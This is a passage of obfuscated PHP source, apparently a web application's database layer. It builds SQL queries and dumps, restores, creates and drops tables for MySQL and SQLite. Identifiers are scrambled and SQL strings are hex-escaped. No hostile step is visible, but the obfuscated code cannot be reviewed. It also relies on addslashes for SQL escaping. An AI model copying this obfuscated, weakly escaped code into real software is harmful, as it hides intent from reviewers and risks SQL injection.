$„Ó‚äæø =& $_SERVER[Çâä∆◊¡]; $¯ÓÃüòƒ = $öíòﬂËµ = array(); $this->model = $ÅÚ¸Õªó[$„Ó‚äæø[276]]; foreach ($û≠ƒ≈â‹ as $Œ‚Œ◊Æ¢ => $Ô†œ˙Î“) { if (is_array($Ô†œ˙Î“) && $„Ó‚äæø[292] == $Ô†œ˙Î“[0]) { $öíòﬂËµ[] = $this->parseKey($Œ‚Œ◊Æ¢); $¯ÓÃüòƒ[] = $Ô†œ˙Î“[1]; } elseif (is_scalar($Ô†œ˙Î“) || is_null($Ô†œ˙Î“)) { $öíòﬂËµ[] = $this->parseKey($Œ‚Œ◊Æ¢); $¯ÓÃüòƒ[] = $this->parseValue($Ô†œ˙Î“); } } $•‰ö±ü° = ($í€ï›·¡ ? $„Ó‚äæø[894] : $„Ó‚äæø[895]) . $„Ó‚äæø[896] . $this->parseTable($ÅÚ¸Õªó[$„Ó‚äæø[274]]) . $„Ó‚äæø[890] . implode($„Ó‚äæø[50], $öíòﬂËµ) . $„Ó‚äæø[891] . implode($„Ó‚äæø[50], $¯ÓÃüòƒ) . $„Ó‚äæø[892]; $•‰ö±ü° .= $this->parseLock(isset($ÅÚ¸Õªó[$„Ó‚äæø[836]]) ? $ÅÚ¸Õªó[$„Ó‚äæø[836]] : !1); $•‰ö±ü° .= $this->parseComment(!empty($ÅÚ¸Õªó[$„Ó‚äæø[349]]) ? $ÅÚ¸Õªó[$„Ó‚äæø[349]] : $„Ó‚äæø[12]); return $this->execute($•‰ö±ü°, $this->parseBind(!empty($ÅÚ¸Õªó[$„Ó‚äæø[280]]) ? $ÅÚ¸Õªó[$„Ó‚äæø[280]] : array())); } public function selectInsert($´“®∫ï, $öçˆœ∆Ä, $Êúà˝˙˝ = array()) { $ı˝Õ˜ßÁ =& $_SERVER[Çâä∆◊¡]; $this->model = $Êúà˝˙˝[$ı˝Õ˜ßÁ[276]]; if (is_string($´“®∫ï)) { $´“®∫ï = explode($ı˝Õ˜ßÁ[50], $´“®∫ï); } array_walk($´“®∫ï, array($this, $ı˝Õ˜ßÁ[893])); $ª¯Û„Ù£ = $ı˝Õ˜ßÁ[1027] . $this->parseTable($öçˆœ∆Ä) . $ı˝Õ˜ßÁ[890] . implode($ı˝Õ˜ßÁ[50], $´“®∫ï) . $ı˝Õ˜ßÁ[1005]; $ª¯Û„Ù£ .= $this->buildSelectSql($Êúà˝˙˝); return $this->execute($ª¯Û„Ù£, $this->parseBind(!empty($Êúà˝˙˝[$ı˝Õ˜ßÁ[280]]) ? $Êúà˝˙˝[$ı˝Õ˜ßÁ[280]] : array())); } public function update($ÄÙñÙõØ, $¨Áâé¡›) { $ÁÉÂë»Ù =& $_SERVER[Çâä∆◊¡]; $this->model = $¨Áâé¡›[$ÁÉÂë»Ù[276]]; $¯é∫å¥¯ = $ÁÉÂë»Ù[1028] . $this->parseTable($¨Áâé¡›[$ÁÉÂë»Ù[274]]) . $this->parseSet($ÄÙñÙõØ) . $this->parseWhere(!empty($¨Áâé¡›[$ÁÉÂë»Ù[270]]) ? $¨Áâé¡›[$ÁÉÂë»Ù[270]] : $ÁÉÂë»Ù[12]) . $this->parseOrder(!empty($¨Áâé¡›[$ÁÉÂë»Ù[360]]) ? $¨Áâé¡›[$ÁÉÂë»Ù[360]] : $ÁÉÂë»Ù[12]) . $this->parseLimit(!empty($¨Áâé¡›[$ÁÉÂë»Ù[287]]) ? $¨Áâé¡›[$ÁÉÂë»Ù[287]] : $ÁÉÂë»Ù[12]) . $this->parseLock(isset($¨Áâé¡›[$ÁÉÂë»Ù[836]]) ? $¨Áâé¡›[$ÁÉÂë»Ù[836]] : !1) . $this->parseComment(!empty($¨Áâé¡›[$ÁÉÂë»Ù[349]]) ? $¨Áâé¡›[$ÁÉÂë»Ù[349]] : $ÁÉÂë»Ù[12]); return $this->execute($¯é∫å¥¯, $this->parseBind(!empty($¨Áâé¡›[$ÁÉÂë»Ù[280]]) ? $¨Áâé¡›[$ÁÉÂë»Ù[280]] : array())); } public function delete($üûÃÉ¸Ó = array()) { $â°·ë¨  =& $_SERVER[Çâä∆◊¡]; $this->model = $üûÃÉ¸Ó[$â°·ë¨ [276]]; $ÇºàÁûÚ = $â°·ë¨ [1029] . $this->parseTable($üûÃÉ¸Ó[$â°·ë¨ [274]]) . $this->parseWhere(!empty($üûÃÉ¸Ó[$â°·ë¨ [270]]) ? $üûÃÉ¸Ó[$â°·ë¨ [270]] : $â°·ë¨ [12]) . $this->parseOrder(!empty($üûÃÉ¸Ó[$â°·ë¨ [360]]) ? $üûÃÉ¸Ó[$â°·ë¨ [360]] : $â°·ë¨ [12]) . $this->parseLimit(!empty($üûÃÉ¸Ó[$â°·ë¨ [287]]) ? $üûÃÉ¸Ó[$â°·ë¨ [287]] : $â°·ë¨ [12]) . $this->parseLock(isset($üûÃÉ¸Ó[$â°·ë¨ [836]]) ? $üûÃÉ¸Ó[$â°·ë¨ [836]] : !1) . $this->parseComment(!empty($üûÃÉ¸Ó[$â°·ë¨ [349]]) ? $üûÃÉ¸Ó[$â°·ë¨ [349]] : $â°·ë¨ [12]); return $this->execute($ÇºàÁûÚ, $this->parseBind(!empty($üûÃÉ¸Ó[$â°·ë¨ [280]]) ? $üûÃÉ¸Ó[$â°·ë¨ [280]] : array())); } public function select($˙’£˜Ø© = array()) { $™‹Ë≥˙ =& $_SERVER[Çâä∆◊¡]; $this->model = $˙’£˜Ø©[$™‹Ë≥˙[276]]; $é∆›‚Æ = $this->buildSelectSql($˙’£˜Ø©); $èﬁªÂöà = isset($˙’£˜Ø©[$™‹Ë≥˙[344]]) ? $˙’£˜Ø©[$™‹Ë≥˙[344]] : !1; if ($èﬁªÂöà) { $◊ÅÅ˜£ˆ = is_string($èﬁªÂöà[$™‹Ë≥˙[95]]) ? $èﬁªÂöà[$™‹Ë≥˙[95]] : $™‹Ë≥˙[1030] . md5($é∆›‚Æ); $ëÊêÇ˙≤ = think_cache($◊ÅÅ˜£ˆ, $™‹Ë≥˙[12], $èﬁªÂöà); if (!1 !== $ëÊêÇ˙≤) { return $ëÊêÇ˙≤; } } $ı—Œ€÷· = $this->query($é∆›‚Æ, $this->parseBind(!empty($˙’£˜Ø©[$™‹Ë≥˙[280]]) ? $˙’£˜Ø©[$™‹Ë≥˙[280]] : array())); if ($èﬁªÂöà && !1 !== $ı—Œ€÷·) { think_cache($◊ÅÅ˜£ˆ, $ı—Œ€÷·, $èﬁªÂöà); } return $ı—Œ€÷·; } public function buildSelectSql($ﬂ•ëÅ¯– = array()) { $ÎÆø¥œ˙ =& $_SERVER[Çâä∆◊¡]; if (isset($ﬂ•ëÅ¯–[$ÎÆø¥œ˙[348]])) { if (strpos($ﬂ•ëÅ¯–[$ÎÆø¥œ˙[348]], $ÎÆø¥œ˙[50])) { list($˜À◊‹‚ç, $¯ÆÎéœ°) = explode($ÎÆø¥œ˙[50], $ﬂ•ëÅ¯–[$ÎÆø¥œ˙[348]]); } else { $˜À◊‹‚ç = $ﬂ•ëÅ¯–[$ÎÆø¥œ˙[348]]; } $˜À◊‹‚ç = $˜À◊‹‚ç ? $˜À◊‹‚ç : 1; $¯ÆÎéœ° = isset($¯ÆÎéœ°) ? $¯ÆÎéœ° : (is_numeric($ﬂ•ëÅ¯–[$ÎÆø¥œ˙[287]]) ? $ﬂ•ëÅ¯–[$ÎÆø¥œ˙[287]] : 20); $ë˝ïÆ¡› = $¯ÆÎéœ° * ((int) $˜À◊‹‚ç - 1); $ﬂ•ëÅ¯–[$ÎÆø¥œ˙[287]] = $ë˝ïÆ¡› . $ÎÆø¥œ˙[50] . $¯ÆÎéœ°; } if (think_config($ÎÆø¥œ˙[1031])) { $òò∑Éæå = $ÎÆø¥œ˙[1032] . md5(serialize($ﬂ•ëÅ¯–)); $˜Üç Ø” = think_cache($òò∑Éæå); if ($˜Üç Ø”) { return $˜Üç Ø”; } } $´€ÿ…’ö = $this->parseSql($this->selectSql, $ﬂ•ëÅ¯–); $´€ÿ…’ö .= $this->parseLock(isset($ﬂ•ëÅ¯–[$ÎÆø¥œ˙[836]]) ? $ﬂ•ëÅ¯–[$ÎÆø¥œ˙[836]] : !1); if (isset($òò∑Éæå)) { think_cache($òò∑Éæå, $´€ÿ…’ö); } return $´€ÿ…’ö; } public function parseSql($¶ˆ˝˝åõ, $úÙ∂öÁ∞ = array()) { $˛È˛˚ÆÙ =& $_SERVER[Çâä∆◊¡]; $¶ˆ˝˝åõ = str_replace(array($˛È˛˚ÆÙ[1033], $˛È˛˚ÆÙ[1034], $˛È˛˚ÆÙ[1035], $˛È˛˚ÆÙ[1036], $˛È˛˚ÆÙ[1037], $˛È˛˚ÆÙ[1038], $˛È˛˚ÆÙ[1039], $˛È˛˚ÆÙ[1040], $˛È˛˚ÆÙ[1041], $˛È˛˚ÆÙ[1042], $˛È˛˚ÆÙ[1043]), array($this->parseTable("{$úÙ∂öÁ∞[$˛È˛˚ÆÙ[274]]}"), $this->parseDistinct(isset($úÙ∂öÁ∞[$˛È˛˚ÆÙ[1044]]) ? $úÙ∂öÁ∞[$˛È˛˚ÆÙ[1044]] : !1), $this->parseField(!empty($úÙ∂öÁ∞[$˛È˛˚ÆÙ[268]]) ? $úÙ∂öÁ∞[$˛È˛˚ÆÙ[268]] : $˛È˛˚ÆÙ[181]), $this->parseJoin(!empty($úÙ∂öÁ∞[$˛È˛˚ÆÙ[277]]) ? $úÙ∂öÁ∞[$˛È˛˚ÆÙ[277]] : $˛È˛˚ÆÙ[12]), $this->parseWhere(!empty($úÙ∂öÁ∞[$˛È˛˚ÆÙ[270]]) ? $úÙ∂öÁ∞[$˛È˛˚ÆÙ[270]] : $˛È˛˚ÆÙ[12]), $this->parseGroup(!empty($úÙ∂öÁ∞[$˛È˛˚ÆÙ[515]]) ? $úÙ∂öÁ∞[$˛È˛˚ÆÙ[515]] : $˛È˛˚ÆÙ[12]), $this->parseHaving(!empty($úÙ∂öÁ∞[$˛È˛˚ÆÙ[1045]]) ? $úÙ∂öÁ∞[$˛È˛˚ÆÙ[1045]] : $˛È˛˚ÆÙ[12]), $this->parseOrder(!empty($úÙ∂öÁ∞[$˛È˛˚ÆÙ[360]]) ? $úÙ∂öÁ∞[$˛È˛˚ÆÙ[360]] : $˛È˛˚ÆÙ[12]), $this->parseLimit(!empty($úÙ∂öÁ∞[$˛È˛˚ÆÙ[287]]) ? $úÙ∂öÁ∞[$˛È˛˚ÆÙ[287]] : $˛È˛˚ÆÙ[12]), $this->parseUnion(!empty($úÙ∂öÁ∞[$˛È˛˚ÆÙ[342]]) ? $úÙ∂öÁ∞[$˛È˛˚ÆÙ[342]] : $˛È˛˚ÆÙ[12]), $this->parseComment(!empty($úÙ∂öÁ∞[$˛È˛˚ÆÙ[349]]) ? $úÙ∂öÁ∞[$˛È˛˚ÆÙ[349]] : $˛È˛˚ÆÙ[12])), $¶ˆ˝˝åõ); return $¶ˆ˝˝åõ; } public function getLastSql($…í ‰Ñ¯ = '') { return $…í ‰Ñ¯ ? $this->modelSql[$…í ‰Ñ¯] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ﬁïÇ÷•ù) { return addslashes($ﬁïÇ÷•ù); } public function setModel($ÖÄ∞ñÍœ) { $this->model = $ÖÄ∞ñÍœ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto aœ◊ﬁ±”Ìµ; aœ◊ﬁ±”Ìµ: class DbManage { function __construct($˚«ÆæÆê = array()) { $ú”¯ÑÙ‹ =& $_SERVER[Çâä∆◊¡]; if (empty($˚«ÆæÆê)) { $˚«ÆæÆê = $GLOBALS[$ú”¯ÑÙ‹[6]][$ú”¯ÑÙ‹[21]]; } $this->database = $˚«ÆæÆê; } public function model($¸«Œø‘ç = '') { return new ModelBase($¸«Œø‘ç, $_SERVER[Çâä∆◊¡][12], $this->database); } public function db($¥˘îöä = false) { $Ø◊•¯Ú¨ =& $_SERVER[Çâä∆◊¡]; $¿âíÛà∫ = array_change_key_case($this->database); if ($this->dbType() == $Ø◊•¯Ú¨[13] || !$¥˘îöä) { return $this->model()->db(); } $©àîÏ¿ﬂ = $¿âíÛà∫[$Ø◊•¯Ú¨[959]]; $¿âíÛà∫[$Ø◊•¯Ú¨[959]] = $Ø◊•¯Ú¨[12]; if ($¿âíÛà∫[$Ø◊•¯Ú¨[954]] == $Ø◊•¯Ú¨[951]) { $’ëóƒÂ— = $¿âíÛà∫[$Ø◊•¯Ú¨[960]]; $¿âíÛà∫[$Ø◊•¯Ú¨[960]] = substr($’ëóƒÂ—, 0, strrpos($’ëóƒÂ—, $Ø◊•¯Ú¨[1046])); } $this->database = $¿âíÛà∫; $ï›ø±Àª = $this->model()->db(); try { $≠òÅΩˆø = $ï›ø±Àª->execute("\163\x68\157\167\40\x64\x61\x74\141\x62\x61\163\145\x73\40\154\x69\153\145\x20\x27{$©àîÏ¿ﬂ}\x27"); } catch (Exception $úÔˆì¯ë) { } if (!$≠òÅΩˆø) { $ï›ø±Àª->execute("\x63\x72\145\x61\164\x65\x20\x64\x61\x74\x61\142\x61\163\145\40\140{$©àîÏ¿ﬂ}\x60"); } $¿âíÛà∫[$Ø◊•¯Ú¨[959]] = $©àîÏ¿ﬂ; if ($¿âíÛà∫[$Ø◊•¯Ú¨[954]] == $Ø◊•¯Ú¨[951]) { $¿âíÛà∫[$Ø◊•¯Ú¨[960]] .= $Ø◊•¯Ú¨[1046] . $©àîÏ¿ﬂ; } $this->database = $¿âíÛà∫; $ï›ø±Àª->execute("\165\x73\145\40\140{$©àîÏ¿ﬂ}\140"); return $ï›ø±Àª; } public function createTable($èü‘¢±, &$◊˚Úë•Ù) { $Ü°‘≠π˙ =& $_SERVER[Çâä∆◊¡]; if (!IO::exist($èü‘¢±)) { ActionCall($Ü°‘≠π˙[1047], !0, 0); show_json(LNG($Ü°‘≠π˙[1048]), !1); } $ˆ∞Èâ˘Ó = $this->model()->db(); $Ù°Œí´˝ = sqlSplit(IO::getContent($èü‘¢±)); foreach ($Ù°Œí´˝ as $≈ËÌÃ∂å) { $ıü£∏»˙ = stripos($≈ËÌÃ∂å, $Ü°‘≠π˙[1049]) === 0; if ($ıü£∏»˙) { $◊˚Úë•Ù->task[$Ü°‘≠π˙[779]] += 1; } $ˆ∞Èâ˘Ó->execute($≈ËÌÃ∂å); if ($ıü£∏»˙) { preg_match($Ü°‘≠π˙[1050], $≈ËÌÃ∂å, $ﬁà√µ⁄™); $◊˚Úë•Ù->task[$Ü°‘≠π˙[1051]] = $ﬁà√µ⁄™[1]; $◊˚Úë•Ù->update(1); } } } public function insertTable($†ì≠ú…®, &$ƒü“˙ Œ) { $ó√ÖñÍº =& $_SERVER[Çâä∆◊¡]; $ÛÈ∫∏™ô = $this->model()->db(); $ÁÉﬂß…ª = $∞‘Õü®è ? array($∞‘Õü®è) : $ÛÈ∫∏™ô->getTables(); foreach ($†ì≠ú…® as $éô§Öê∫) { $∞‘Õü®è = basename($éô§Öê∫, $ó√ÖñÍº[781]); if (!in_array($∞‘Õü®è, $ÁÉﬂß…ª)) { continue; } $ƒü“˙ Œ->task[$ó√ÖñÍº[1051]] = $∞‘Õü®è; if (get_filesize($éô§Öê∫) == 0) { continue; } $æÒﬂ£ªÿ = $this->sqlToDb($éô§Öê∫, $ƒü“˙ Œ); if (!$æÒﬂ£ªÿ) { ActionCall($ó√ÖñÍº[1047], !0, 0); show_json(LNG($ó√ÖñÍº[1052]) . "\x5b{$∞‘Õü®è}\135", !1); } } } public function sqlFromDb($ÇÃ˘’§È, $Òô˝‰âÁ, &$ÎÓç◊Û§, $˛˘∂µΩ¸ = '') { if ($ÎÓç◊Û§) { $ÎÓç◊Û§->task[$_SERVER[Çâä∆◊¡][1051]] = $ÇÃ˘’§È; } $™—¢Ôîì = $this->model($ÇÃ˘’§È); $◊ªâô®æ = 0; $»å€ÍÂË = 0; $Ì∑ôÚÛ = 10000; $ø™˝ÔΩÔ = fopen($Òô˝‰âÁ, $_SERVER[Çâä∆◊¡][1053]); $Ïç¢øí∂ = $™—¢Ôîì->getPk(); $◊©Á≈„Õ = $™—¢Ôîì->getDbFields(); $≠•¢Ù¨˛ = $_SERVER[Çâä∆◊¡][12]; if ($GLOBALS[$_SERVER[Çâä∆◊¡][780]] && in_array($ÇÃ˘’§È, array($_SERVER[Çâä∆◊¡][1054], $_SERVER[Çâä∆◊¡][1055]))) { $≠•¢Ù¨˛ = $ÇÃ˘’§È; } do { $∂≠ç±Ê¢ = array($Ïç¢øí∂ => array($_SERVER[Çâä∆◊¡][1001], $»å€ÍÂË)); $›Á¿ÏüÉ = $™—¢Ôîì->where($∂≠ç±Ê¢)->field($◊©Á≈„Õ)->order($Ïç¢øí∂ . $_SERVER[Çâä∆◊¡][1056])->limit($Ì∑ôÚÛ)->select(); $›Á¿ÏüÉ = !empty($›Á¿ÏüÉ) ? $›Á¿ÏüÉ : array(); if (!($¶üÅÑ¯¥ = count($›Á¿ÏüÉ))) { break; } $ƒÎª¿∫ë = end($›Á¿ÏüÉ); $»å€ÍÂË = $ƒÎª¿∫ë[$Ïç¢øí∂]; $ªâ¡∑ƒÇ = array(); foreach ($›Á¿ÏüÉ as $πß‰Ñùü) { if ($≠•¢Ù¨˛) { if ($ÇÃ˘’§È == $_SERVER[Çâä∆◊¡][1054]) { if ($πß‰Ñùü[$_SERVER[Çâä∆◊¡][33]] == $_SERVER[Çâä∆◊¡][1057]) { $Ìı≠Ö‹Ñ = json_decode($πß‰Ñùü[$_SERVER[Çâä∆◊¡][369]], !0); if ($Ìı≠Ö‹Ñ[$_SERVER[Çâä∆◊¡][32]] == $GLOBALS[$_SERVER[Çâä∆◊¡][780]] && $Ìı≠Ö‹Ñ[$_SERVER[Çâä∆◊¡][743]] != 1) { continue; } } } else { if ($πß‰Ñùü[$_SERVER[Çâä∆◊¡][33]] == $_SERVER[Çâä∆◊¡][1058] && $πß‰Ñùü[$_SERVER[Çâä∆◊¡][95]] == $_SERVER[Çâä∆◊¡][772]) { continue; } } } if ($˛˘∂µΩ¸) { $πß‰Ñùü[$_SERVER[Çâä∆◊¡][78]] = "\x7b\151\157\72{$˛˘∂µΩ¸}\175" . substr($πß‰Ñùü[$_SERVER[Çâä∆◊¡][78]], strlen("\173\x69\157\72{$πß‰Ñùü[$_SERVER[Çâä∆◊¡][810]]}\x7d")); $πß‰Ñùü[$_SERVER[Çâä∆◊¡][810]] = $˛˘∂µΩ¸; } $ªâ¡∑ƒÇ[] = $_SERVER[Çâä∆◊¡][1059] . $this->sqlEncode($πß‰Ñùü) . $_SERVER[Çâä∆◊¡][1060]; } $‘å©–∆˘ = "\x49\x4e\x53\x45\x52\x54\x20\111\x4e\x54\x4f\x20\140{$ÇÃ˘’§È}\x60\x20\x28\x60" . implode($_SERVER[Çâä∆◊¡][1061], $◊©Á≈„Õ) . $_SERVER[Çâä∆◊¡][1062]; fwrite($ø™˝ÔΩÔ, $‘å©–∆˘ . implode($_SERVER[Çâä∆◊¡][1063], $ªâ¡∑ƒÇ) . $_SERVER[Çâä∆◊¡][71] . PHP_EOL); $◊ªâô®æ += $¶üÅÑ¯¥; if ($ÎÓç◊Û§) { $ÎÓç◊Û§->update($¶üÅÑ¯¥); } } while ($Ì∑ôÚÛ == $¶üÅÑ¯¥); fclose($ø™˝ÔΩÔ); return $◊ªâô®æ; } public function sqlToDb($ª≤¨ã¡à, &$êñÏ©˙Î) { $éﬂÁ√ºæ =& $_SERVER[Çâä∆◊¡]; $ùá»Îì§ = $this->model()->db(); $≤˙’ﬂõï = @fopen($ª≤¨ã¡à, $éﬂÁ√ºæ[1064]); if (!$≤˙’ﬂõï) { return !1; } $õÅÈÓí⁄ = 0; $“Çú’º— = $éﬂÁ√ºæ[12]; $Ïû∞ÈôÊ = array(); $åÂ‚‚ÅÉ = $this->dbType(); $Æ˘ÄãË‚ = $åÂ‚‚ÅÉ == $éﬂÁ√ºæ[13] ? 500 : 2000; $È¬÷∑…Ù = basename($ª≤¨ã¡à, $éﬂÁ√ºæ[781]); $ÔÍÿ»†ÿ = 0; $ê‘òÊÎä = 4194304 - 104858; $‹ôé•“ˆ = 1000000 - 104858; while (!feof($≤˙’ﬂõï)) { $÷åøæ›ñ = trim(fgets($≤˙’ﬂõï)); if (!$÷åøæ›ñ) { continue; } $˜”˝˘‘¥ = $this->sqlDecode($÷åøæ›ñ, $åÂ‚‚ÅÉ, $È¬÷∑…Ù); if (stripos($˜”˝˘‘¥, $éﬂÁ√ºæ[350]) === 0) { if (!$“Çú’º—) { $“Çú’º— = $˜”˝˘‘¥ . $éﬂÁ√ºæ[53]; } continue; } if ($êñÏ©˙Î) { $êñÏ©˙Î->task[$éﬂÁ√ºæ[779]] += 1; } $õÅÈÓí⁄++; $Ïû∞ÈôÊ[] = rtrim(rtrim(trim($˜”˝˘‘¥), $éﬂÁ√ºæ[50]), $éﬂÁ√ºæ[71]); $êÌ†õçç = null; $÷é‘Ïˆ∑ = strlen($˜”˝˘‘¥); $ÔÍÿ»†ÿ += $÷é‘Ïˆ∑; if ($ÔÍÿ»†ÿ >= ($Æ˘ÄãË‚ == 500 ? $‹ôé•“ˆ : $ê‘òÊÎä)) { $êÌ†õçç = array_pop($Ïû∞ÈôÊ); if ($õÅÈÓí⁄ > 1) { $õÅÈÓí⁄--; } } if ($õÅÈÓí⁄ >= $Æ˘ÄãË‚ || $êÌ†õçç) { $˜”˝˘‘¥ = $“Çú’º— . implode($éﬂÁ√ºæ[50], $Ïû∞ÈôÊ); if (!$ùá»Îì§->execute($˜”˝˘‘¥)) { return !1; } if ($êñÏ©˙Î) { $êñÏ©˙Î->update($õÅÈÓí⁄); } $Ïû∞ÈôÊ = array(); $õÅÈÓí⁄ = 0; $ÔÍÿ»†ÿ = 0; if ($êÌ†õçç) { $Ïû∞ÈôÊ = array($êÌ†õçç); $õÅÈÓí⁄ = 1; $ÔÍÿ»†ÿ = $÷é‘Ïˆ∑; } } } fclose($≤˙’ﬂõï); if (!empty($Ïû∞ÈôÊ)) { $˜”˝˘‘¥ = $“Çú’º— . implode($éﬂÁ√ºæ[50], $Ïû∞ÈôÊ); if (!$ùá»Îì§->execute($˜”˝˘‘¥)) { return !1; } if ($êñÏ©˙Î) { $êñÏ©˙Î->update($õÅÈÓí⁄); } } return !0; } public function dropTable($´–ÚóåÒ = null) { $ﬂ·›–íê = $this->model()->db(); $ŒÓıÑ⁄ı = $´–ÚóåÒ ? array($´–ÚóåÒ) : $ﬂ·›–íê->getTables(); if (!$ŒÓıÑ⁄ı) { return; } foreach ($ŒÓıÑ⁄ı as $´–ÚóåÒ) { if ($´–ÚóåÒ) { $´–ÚóåÒ = strtolower($´–ÚóåÒ); } else { continue; } $ﬂ·›–íê->execute("\x64\162\157\160\40\164\x61\x62\154\145\40\x69\x66\x20\x65\x78\151\x73\x74\x73\40\x60{$´–ÚóåÒ}\x60"); } } private function sqlEncode($Á˚æäñÈ) { $„•·¬Ù‘ =& $_SERVER[Çâä∆◊¡]; $û∂àáß = array(); foreach ($Á˚æäñÈ as $‹øÓßıΩ) { if (is_array($‹øÓßıΩ)) { $‹øÓßıΩ = json_encode_force($‹øÓßıΩ); } $‹øÓßıΩ = addslashes($‹øÓßıΩ); $‹øÓßıΩ = str_replace(array($„•·¬Ù‘[1065], $„•·¬Ù‘[226]), array($„•·¬Ù‘[1066], $„•·¬Ù‘[1067]), $‹øÓßıΩ); $û∂àáß[] = str_replace($„•·¬Ù‘[58], $„•·¬Ù‘[1068], $‹øÓßıΩ); } return $„•·¬Ù‘[58] . implode($„•·¬Ù‘[1069], $û∂àáß) . $„•·¬Ù‘[58]; } private function sqlDecode($âìüÎ∏Ó, $òΩõÊ¬¡, $à›ß≠‹ë = '') { $≤“Èº’ê =& $_SERVER[Çâä∆◊¡]; $âìüÎ∏Ó = str_replace(array($≤“Èº’ê[1066], $≤“Èº’ê[1067]), array($≤“Èº’ê[1065], $≤“Èº’ê[226]), $âìüÎ∏Ó); if ($òΩõÊ¬¡ == $≤“Èº’ê[13]) { return $à›ß≠‹ë != $≤“Èº’ê[1070] ? stripslashes($âìüÎ∏Ó) : $âìüÎ∏Ó; } if ($à›ß≠‹ë == $≤“Èº’ê[1070]) { $âìüÎ∏Ó = str_replace($≤“Èº’ê[1071], $≤“Èº’ê[117], stripslashes($âìüÎ∏Ó)); } return $âìüÎ∏Ó; } public function getSqlFile($¥ﬁÌú∏∑ = '') { $≈∏«ÚÄ˘ =& $_SERVER[Çâä∆◊¡]; $í¨∑ù–¯ = $this->dbType(!0); $∏£í˚áﬂ = CONTROLLER_DIR . "\x69\x6e\163\164\x61\154\154\57\x64\141\164\x61\57{$í¨∑ù–¯}\56\x73\x71\x6c"; $Å¯ÎïæÌ = file_get_contents($∏£í˚áﬂ); $‹æ—∂ˆ˘ = $≈∏«ÚÄ˘[1072] . ($í¨∑ù–¯ == $≈∏«ÚÄ˘[797] ? $≈∏«ÚÄ˘[1073] : $≈∏«ÚÄ˘[1074]) . $≈∏«ÚÄ˘[1075]; preg_match_all($‹æ—∂ˆ˘, $Å¯ÎïæÌ, $‰ÏœÎÏƒ); $•¢‹Í˚ê = $‰ÏœÎÏƒ[1]; $·™™ﬁ’Ç = $this->model()->db(); $≠ä”ô◊Ü = $·™™ﬁ’Ç->getTables(); $∂èƒ¡π‰ = TEMP_FILES . $≈∏«ÚÄ˘[1076] . date($≈∏«ÚÄ˘[744]) . $≈∏«ÚÄ˘[8]; del_dir($∂èƒ¡π‰); mk_dir($∂èƒ¡π‰); $çíÖ¡Çæ = $∂èƒ¡π‰ . $≈∏«ÚÄ˘[1077]; $Ô≥õ˚îÕ = $∂èƒ¡π‰ . $≈∏«ÚÄ˘[1078]; $¢êÏ®‡• = $í¨∑ù–¯ == $≈∏«ÚÄ˘[13] ? $≈∏«ÚÄ˘[797] : $≈∏«ÚÄ˘[13]; IO::copy(CONTROLLER_DIR . "\x69\156\x73\164\x61\x6c\154\x2f\x64\x61\164\141\x2f{$¢êÏ®‡•}\56\x73\x71\x6c", $∂èƒ¡π‰); @touch($∂èƒ¡π‰ . $í¨∑ù–¯ . $≈∏«ÚÄ˘[781]); $ÄÂÀ‰º√ = fopen($çíÖ¡Çæ, $≈∏«ÚÄ˘[1053]); $õΩ∏Çìÿ = fopen($Ô≥õ˚îÕ, $≈∏«ÚÄ˘[1053]); if ($í¨∑ù–¯ == $≈∏«ÚÄ˘[13]) { $≠ä”ô◊Ü = array_diff($≠ä”ô◊Ü, array($≈∏«ÚÄ˘[777], $≈∏«ÚÄ˘[778])); $ÔÒ÷â˜¥ = array($≈∏«ÚÄ˘[1079], $≈∏«ÚÄ˘[1080], $≈∏«ÚÄ˘[1081]); fwrite($õΩ∏Çìÿ, implode(PHP_EOL, $ÔÒ÷â˜¥) . PHP_EOL . PHP_EOL); foreach ($≠ä”ô◊Ü as $ïßÍ§Ç¶) { $û—®”ä– = $this->sqlFromSqlite($ïßÍ§Ç¶); if (!$û—®”ä–[$≈∏«ÚÄ˘[13]]) { continue; } fwrite($õΩ∏Çìÿ, $û—®”ä–[$≈∏«ÚÄ˘[13]] . PHP_EOL . PHP_EOL); if (!in_array($ïßÍ§Ç¶, $•¢‹Í˚ê)) { fwrite($ÄÂÀ‰º√, $û—®”ä–[$≈∏«ÚÄ˘[797]] . PHP_EOL . PHP_EOL); } } } else { foreach ($≠ä”ô◊Ü as $ïßÍ§Ç¶) { $û—®”ä– = $this->sqlFromMysql($ïßÍ§Ç¶); if (!$û—®”ä–[$≈∏«ÚÄ˘[797]]) { continue; } fwrite($ÄÂÀ‰º√, $û—®”ä–[$≈∏«ÚÄ˘[797]] . PHP_EOL . PHP_EOL); if (!in_array($ïßÍ§Ç¶, $•¢‹Í˚ê)) { fwrite($õΩ∏Çìÿ, $û—®”ä–[$≈∏«ÚÄ˘[13]] . PHP_EOL . PHP_EOL); } } } fclose($ÄÂÀ‰º√); fclose($õΩ∏Çìÿ); $Å¯ÎïæÌ = array($≈∏«ÚÄ˘[797] => $çíÖ¡Çæ, $≈∏«ÚÄ˘[13] => $Ô≥õ˚îÕ); return $¥ﬁÌú∏∑ ? $Å¯ÎïæÌ[$¥ﬁÌú∏∑] : $Å¯ÎïæÌ; } public function dbType($⁄ ÙâÂú = false) { $â‘∫¡áÖ =& $_SERVER[Çâä∆◊¡]; $äû∆£≈Ä = $⁄ ÙâÂú ? $GLOBALS[$â‘∫¡áÖ[6]][$â‘∫¡áÖ[21]] : $this->database; $äû∆£≈Ä = array_change_key_case($äû∆£≈Ä); $ãá≥÷ªâ = $äû∆£≈Ä[$â‘∫¡áÖ[954]]; if ($ãá≥÷ªâ == $â‘∫¡áÖ[951]) { $üùï¢‰ú = explode($â‘∫¡áÖ[4], $äû∆£≈Ä[$â‘∫¡áÖ[960]]); $ãá≥÷ªâ = $üùï¢‰ú[0]; } $≈äŒÄ™“ = array($â‘∫¡áÖ[1082] => $â‘∫¡áÖ[13], $â‘∫¡áÖ[899] => $â‘∫¡áÖ[797]); if (isset($≈äŒÄ™“[$ãá≥÷ªâ])) { $ãá≥÷ªâ = $≈äŒÄ™“[$ãá≥÷ªâ]; } return $ãá≥÷ªâ; } public function sqlFromMysql($·‰ÉÛ∆¡, $î˝ÙÓäñ = '') { $ÈíÉÍÛ· =& $_SERVER[Çâä∆◊¡]; $Ëﬁñ˜©± = $this->model()->db(); $öÎ ‡øÚ = $Ëﬁñ˜©±->query($ÈíÉÍÛ·[1083] . $·‰ÉÛ∆¡ . $ÈíÉÍÛ·[380]); if (!$öÎ ‡øÚ || !$öÎ ‡øÚ[0]) { return !1; } 